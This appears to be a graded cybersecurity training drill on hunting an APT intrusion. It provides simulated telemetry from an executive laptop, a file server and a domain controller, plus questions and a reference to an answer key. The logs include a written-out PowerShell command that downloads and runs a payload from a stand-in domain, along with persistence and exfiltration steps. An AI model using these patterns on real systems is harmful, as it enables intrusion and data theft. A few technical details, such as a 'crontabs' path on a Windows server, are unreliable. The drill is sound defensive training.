# Drill 01 (Advanced): APT Endpoint Hunting

**Level:** Advanced

**Estimated time:** 75 minutes

**Skills tested:** Threat hunting methodology, APT TTPs, cross-host correlation, MITRE ATT&CK pro-level, hypothesis-driven hunting

---

## Scenario

You are the lead threat hunter at a defense contractor.
Your organization handles classified project documentation.
Management has received a tip from a government partner that APT-42 (a state-sponsored threat actor) has been targeting organizations in your sector.
No current alerts exist in the SIEM.

Your task: **Proactively hunt for indicators of APT-42 compromise** across your environment, using the provided telemetry from four systems.

**APT-42 Known TTPs (from threat intelligence):**

* Initial access via spearphishing with weaponized documents
* Uses PowerShell for execution with heavy obfuscation
* Known C2 infrastructure: uses HTTPS to domains registered in the last 30 days
* Achieves persistence via scheduled tasks with names mimicking Windows Update or Microsoft Edge
* Uses LOLBAS for discovery and lateral movement
* Credential theft via LSASS memory access
* Exfiltrates data in compressed encrypted archives
* Known to use DLL side-loading for defense evasion
* Commonly targets documents in: `%USERPROFILE%\Documents`, network shares

---

## Evidence: Multi-Host Telemetry

### HOST 1: EXEC-PC01 (Executive's laptop, Windows 11)
**User:** ceo@corp.local (CEO)

**Timeframe:** 2024-04-15 09:00–11:00 UTC

```text
[09:15:22] PROCESS: OUTLOOK.EXE → WINWORD.EXE
  File: C:\Users\ceo\Downloads\Q1_Strategy_Update.docm

[09:16:05] PROCESS: WINWORD.EXE (PID:3201) → powershell.exe (PID:3301)
  CMD: powershell.exe -exec bypass -w 1 -nop -c "sal a New-Object;$a=a Net.WebClient;$a.DownloadFile('hxxps://edge-analytics-cdn.net/ms/update.bin','C:\Users\ceo\AppData\Local\Temp\update.bin')"

[09:16:11] NETWORK: PID:3301 → 198.51.100.42:443
  DNS: edge-analytics-cdn.net (registered 2024-04-02, 13 days ago)
  Downloaded: update.bin, 892KB

[09:16:22] FILE: PID:3301 → C:\Users\ceo\AppData\Local\Temp\update.bin (892KB, PE, unsigned)

[09:16:25] PROCESS: PID:3301 → rundll32.exe (PID:3401)
  CMD: rundll32.exe C:\Users\ceo\AppData\Local\Temp\update.bin,DllEntryPoint

[09:16:30] NETWORK: PID:3401 → 198.51.100.42:443
  Bytes sent: 256, Bytes recv: 12800 (C2 beacon)
  User-Agent: "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1)"

[09:17:45] PROCESS: PID:3401 → cmd.exe → systeminfo
[09:17:52] PROCESS: PID:3401 → cmd.exe → net group "domain admins" /domain
[09:18:01] PROCESS: PID:3401 → cmd.exe → dir "C:\Users\ceo\Documents" /s /b *.pdf *.docx *.xlsx *.pptx
[09:18:45] PROCESS: PID:3401 → cmd.exe → dir \\FILESERVER01\Projects /s /b *.pdf *.docx *.xlsx

[09:45:00] FILE: C:\Users\ceo\AppData\Local\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.dll (134KB, signed=false)
  Note: Identical name to legitimate file but wrong hash and location

[09:46:00] PROCESS: MicrosoftEdge.exe → MicrosoftEdgeUpdate.dll (DLL LOADED)
  Note: Sideloaded malicious DLL via legitimate Edge process

[10:02:00] REGISTRY: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftEdgeUpdate
  Value: "C:\Users\ceo\AppData\Local\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.dll"

[10:30:00] FILE: C:\Users\ceo\AppData\Local\Temp\exfil_001.7z (47MB, password-protected archive)
  Contains: Documents from C:\Users\ceo\Documents and \\FILESERVER01\Projects

[10:31:00] NETWORK: PID:3401 → 198.51.100.42:443
  Bytes sent: 47.2MB, Bytes recv: 256  ← EXFILTRATION
  Duration: 4 minutes 12 seconds
```

---

### HOST 2: FILESERVER01 (Windows Server 2019, File Server)
**Timeframe:** 2024-04-15 09:45–10:30 UTC

```text
[09:48:22] PROCESS: svchost.exe → powershell.exe
  CMD: powershell -enc [238-char Base64 string]
  Note: This spawning pattern consistent with WMI consumer fire

[09:48:35] PROCESS: powershell.exe → cmd.exe → net localgroup administrators
[09:48:41] NETWORK: powershell.exe → 198.51.100.42:443

[09:49:00] FILE ACCESSED (READ): \\FILESERVER01\Projects\ClearanceL3\*.docx (847 files)
  Accessed by: CORP\ceo (authenticated session from EXEC-PC01, PID 3401's network session)
  Note: CEO does not normally access ClearanceL3 project files

[10:15:00] PROCESS: svchost.exe (SYSTEM) → cmd.exe
  CMD: cmd.exe /c type \\FILESERVER01\C$\Windows\NTDS\Temp\crontabs

[10:22:00] EVENT_4698 (Scheduled Task Created):
  TaskName: \Microsoft\Windows\EdgeUpdate\ScheduledUpdate
  TaskAction: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc [Base64]
  Trigger: Daily at 02:00 (repeat every 4 hours)
  RunAs: SYSTEM
```

---

### HOST 3: DC01 (Domain Controller, Windows Server 2022)
**Timeframe:** 2024-04-15 10:15–10:45 UTC

```text
[10:18:00] EVENT_4769 (Kerberos Service Ticket Request):
  Service: krbtgt/CORP
  Account: ceo@CORP.LOCAL
  IP Address: 10.10.50.100 (EXEC-PC01)
  Encryption: RC4_HMAC_MD5  ← DOWNGRADE INDICATOR

[10:19:00] EVENT_4662 (Object accessed on DC):
  Object: CN=Domain Users,CN=Users,DC=corp,DC=local
  Access: WRITE_PROPERTY
  Source: EXEC-PC01 (acting as ceo@corp.local)
  Note: Attacker querying AD LDAP replication interface — possible DCSync prep

[10:25:00] EVENT_4648 (Explicit credential logon):
  Account Used: svc_backup@corp.local
  Target: DC01
  Source IP: 10.10.50.100 (EXEC-PC01)
  Note: Backup service account used from CEO's workstation — abnormal

[10:30:00] EVENT_4768 (Kerberos TGT Request):
  Account: svc_backup@corp.local
  IP: 10.10.50.100
  Pre-auth type: 0  ← AS-REP ROASTABLE (no pre-auth required)
  Encryption: RC4_HMAC_MD5

[10:35:00] EVENT_4769 (Service Ticket for DC replication):
  Service: GC/DC01.corp.local/corp.local
  Account: svc_backup@corp.local
  Note: Requesting replication service ticket — DCSync preparation
```

---

### HOST 4: ANALYST-WS01 (SOC Analyst Workstation)
**Timeframe:** 2024-04-15 10:45 UTC

```text
No suspicious activity. Clean baseline.
Note: C2 domain 198.51.100.42 is NOT in existing SIEM watchlists.
```

---

## Questions

---

### Q1 — Hunting Hypothesis Generation (3 points)

Before looking at the evidence: Based on the APT-42 intelligence brief provided, write THREE hunting hypotheses in the format:

```text
HYPOTHESIS: "If APT-42 has compromised our environment, we expect to see [X]
             evidenced by [Y] in [data source Z]"
```

Then state which hypotheses were confirmed, partially confirmed, or unconfirmed by the provided evidence.

---

### Q2 — Initial Compromise Analysis (4 points)

Analyze the compromise of EXEC-PC01.

a) Decode and explain what the PowerShell command at 09:16:05 does.
What specific evasion techniques are used?
b) Explain the DLL side-loading technique used at 09:45:00–09:46:00.
How does it evade EDR?
c) The User-Agent used for C2 (`MSIE 9.0 / Windows NT 6.1`) is anomalous.
Why?
d) Map the complete EXEC-PC01 activity to MITRE ATT&CK techniques.

---

### Q3 — Lateral Movement Reconstruction (4 points)

Trace the attacker's lateral movement from EXEC-PC01 to FILESERVER01 to DC01.

a) What credential material did the attacker use to access FILESERVER01, and how did they likely obtain it?
b) Explain the sequence of DC01 events (Q10:18–10:35).
What is the attacker building towards?
Use precise technical terminology.
c) What does RC4_HMAC_MD5 encryption type in Kerberos requests indicate?

---

### Q4 — Exfiltration Analysis (3 points)

Analyze the data exfiltration event.

a) How much data was exfiltrated?
What does the use of a password-protected 7-Zip archive tell you about the attacker's operational security?
b) What data was targeted?
Why is the combination of CEO documents + ClearanceL3 project files particularly sensitive?
c) Write an exfiltration detection rule that would catch large uploads to new/unknown external destinations.

---

### Q5 — Persistence Analysis (3 points)

Two persistence mechanisms were identified.
For each:
a) How would it survive a system reboot?
b) How could it be discovered during a forensic investigation?
c) How would you remove it while preserving forensic evidence?

---

### Q6 — Scope Assessment (4 points)

Based on ALL evidence:

a) How many systems are confirmed compromised?
b) What is the worst-case scenario if the DCSync preparation (Q3b) was completed?
c) Create a recommended isolation/containment sequence.
Explain the order.
d) What systems/data need to be treated as fully compromised even if no direct evidence is found?

---

### Q7 — Write a Threat Hunt Report (5 points)

Write a concise (1-2 page equivalent) threat hunt report containing:

* Executive Summary (3 sentences)
* Systems Affected
* Attack Timeline
* Data at Risk
* Immediate Actions Required
* Detection Gaps (what failed to detect this)

---

## Scoring Guide

Total: 26 points.
Advanced drill — partial credit given for well-reasoned answers that show correct thinking even if details are missing.

**See `solutions/drill-01-solution/README.md` for the complete answer key.**
